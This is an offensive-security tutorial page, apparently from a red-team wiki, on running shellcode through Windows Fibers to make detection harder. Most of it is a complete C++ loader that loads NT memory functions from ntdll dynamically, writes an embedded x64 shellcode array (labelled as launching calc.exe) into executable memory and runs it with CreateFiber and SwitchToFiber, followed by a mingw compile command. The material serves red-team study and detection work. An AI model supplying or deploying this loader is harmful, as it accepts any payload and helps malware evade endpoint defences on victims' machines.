# Fibers Shellcode Execution

## Theory

This technique executes shellcode by leveraging Windows Fibers for indirect execution flow control. Unlike traditional shellcode execution techniques that rely on `CreateThread` or direct function pointers, this method utilizes `ConvertThreadToFiber`, `CreateFiber`, and `SwitchToFiber` to execute shellcode in a fiber's context. This allows execution within an existing thread, making detection more challenging.

Windows fibers are manually scheduled execution units that run within the context of a thread. Unlike threads, fibers do not have their own kernel-managed execution state but instead share the thread's stack and register state. Fibers are useful in scenarios where a program needs finer control over execution switching.

#### Windows Fibers Overview

A fiber is a lightweight execution unit that must be explicitly scheduled by the application. The primary difference between a thread and a fiber is that threads are preemptively scheduled by the OS, whereas fibers must yield execution manually. The Windows API provides the following key functions for working with fibers:

* `ConvertThreadToFiber()`: Converts the calling thread into a fiber, enabling fiber-based execution.
* `CreateFiber()`: Creates a new fiber with a specified stack size and entry function.
* `SwitchToFiber()`: Switches execution to the specified fiber.
* `DeleteFiber()`: Frees resources associated with a fiber when execution completes.

Since fibers execute within the thread that schedules them, all operations performed by a fiber appear as if they were performed by the thread itself. This includes memory access, thread-local storage (TLS), and API calls.

#### Execution Flow

1. **Allocate Memory for Shellcode**:
   * Memory is allocated within the process using `NtAllocateVirtualMemory`.
   * Shellcode is written using `NtWriteVirtualMemory`.
   * Memory protection is changed to executable using `NtProtectVirtualMemory`.
2. **Convert Thread to Fiber**:
   * The calling thread is converted into a fiber using `ConvertThreadToFiber()`. This enables fiber switching within the thread.
3. **Create a Fiber for Shellcode Execution**:
   * `CreateFiber()` is used to create a new fiber pointing to the allocated shellcode.
4. **Switch to Shellcode Fiber**:
   * `SwitchToFiber()` is called to transfer execution to the shellcode fiber.
5. **Return Execution and Cleanup**:
   * Once the shellcode executes, execution returns to the main fiber.
   * The fiber is deleted using `DeleteFiber()`.
   * The thread is reverted back to its original state.

## Practice

{% tabs %}
{% tab title="C++" %}
We maye use the following C++ code to execute the shellcode using fibers:

{% code title="FiberExec.cpp" %}
```cilkcpp
#include <iostream>
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <tchar.h>

// Add these typedefs and function declarations for the NT functions
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    // calc.exe shellcode
    unsigned char decoded[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00};
    SIZE_T length = sizeof(decoded);


    // Load NT functions dynamically
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "Failed to get handle to ntdll.dll" << std::endl;
    }
 
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    
    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory) {
        std::cerr << "Failed to get addresses of NT functions" << std::endl;
    }

    // Prepare variables
    HANDLE hProc = GetCurrentProcess();
    PVOID base_addr = NULL;
    SIZE_T pnew = length;
    SIZE_T bytesWritten = 0;
    DWORD oldProtect = 0;
    NTSTATUS status;

    // Allocate memory for shellcode
    status = NtAllocateVirtualMemory(hProc, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "NtAllocateVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Write shellcode to allocated memory
    status = NtWriteVirtualMemory(hProc, base_addr, decoded, pnew, &bytesWritten);
    if (status != 0) {
        std::cerr << "NtWriteVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    // Change memory protection to executable
    status = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&pnew, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        std::cerr << "NtProtectVirtualMemory failed with status: " << std::hex << status << std::endl;
    }

    std::cout << "Executing shellcode using Fiber-based execution..." << std::endl;

    // Convert current thread to fiber
    PVOID MainFiber = ConvertThreadToFiber(NULL);
    if (!MainFiber) {
        std::cerr << "ConvertThreadToFiber failed with error: " << GetLastError() << std::endl;
    }

    // Create fiber pointing to shellcode
    PVOID ShellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)base_addr, NULL);
    if (!ShellcodeFiber) {
        std::cerr << "CreateFiber failed with error: " << GetLastError() << std::endl;
        ConvertFiberToThread();
    }

    // Switch to shellcode fiber
    SwitchToFiber(ShellcodeFiber);

    // Execution returns here after shellcode completes
    DeleteFiber(ShellcodeFiber);
    ConvertFiberToThread();

    std::cout << "Execution completed" << std::endl;
    return 0;
}

int main()
{
    esc_main(NULL);
    return 0;
}

 
```
{% endcode %}

We can compile it from linux using following command

```bash
x86_64-w64-mingw32-g++ FiberExec.cpp -o FiberExec.exe -std=c++20 -static
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber" %}

{% embed url="https://learn.microsoft.com/en-us/windows/win32/procthread/fibers" %}
